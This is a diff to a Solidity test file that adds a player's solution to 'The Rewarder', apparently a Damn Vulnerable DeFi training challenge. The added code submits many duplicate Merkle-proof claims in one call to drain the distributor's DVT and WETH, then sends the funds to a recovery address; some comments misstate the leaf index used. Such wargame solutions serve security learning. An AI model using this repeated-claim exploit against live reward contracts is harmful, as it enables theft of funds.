@@ -148,7 +148,51 @@ contract TheRewarderChallenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_theRewarder() public checkSolvedByPlayer {
-        
+        // get the amount of tokens to claim
+        console.log("player addr is ", player);
+        // Calculate roots for DVT and WETH distributions
+        bytes32[] memory dvtLeaves = _loadRewards("/test/the-rewarder/dvt-distribution.json");
+        bytes32[] memory wethLeaves = _loadRewards("/test/the-rewarder/weth-distribution.json");
+
+        uint256 dvtClaimAmount = 11524763827831882;
+        uint256 wethClaimAmount = 1171088749244340;
+
+        uint256 dvtTimes = dvt.balanceOf(address(distributor)) / dvtClaimAmount;
+        uint256 wethTimes = weth.balanceOf(address(distributor)) / wethClaimAmount;
+        uint256 totalClaimTimes = dvtTimes + wethTimes;
+
+        Claim[] memory claims = new Claim[](totalClaimTimes);
+
+        for (uint256 i = 0; i < totalClaimTimes; ++i) {
+            if (i < dvtTimes) {
+                claims[i] = Claim({
+                    batchNumber: 0, // claim corresponds to first DVT batch
+                    amount: dvtClaimAmount,
+                    tokenIndex: 0, // claim corresponds to first token in `tokensToClaim` array
+                    proof: merkle.getProof(dvtLeaves, 188) // Alice's address is at index 2
+                });
+            } else {
+                claims[i] = Claim({
+                    batchNumber: 0, // claim corresponds to first WETH batch
+                    amount: wethClaimAmount,
+                    tokenIndex: 1, // claim corresponds to second token in `tokensToClaim` array
+                    proof: merkle.getProof(wethLeaves, 188) // Alice's address is at index 2
+                });
+            }
+        }
+
+        // Set DVT and WETH as tokens to claim
+        IERC20[] memory tokensToClaim = new IERC20[](2);
+        tokensToClaim[0] = IERC20(address(dvt));
+        tokensToClaim[1] = IERC20(address(weth));
+
+        distributor.claimRewards(claims, tokensToClaim);
+
+        uint256 playerdvtBalance = dvt.balanceOf(player);
+        uint256 playerwethBalance = weth.balanceOf(player);
+
+        dvt.transfer(recovery, playerdvtBalance);
+        weth.transfer(recovery, playerwethBalance);
     }
 
     /**
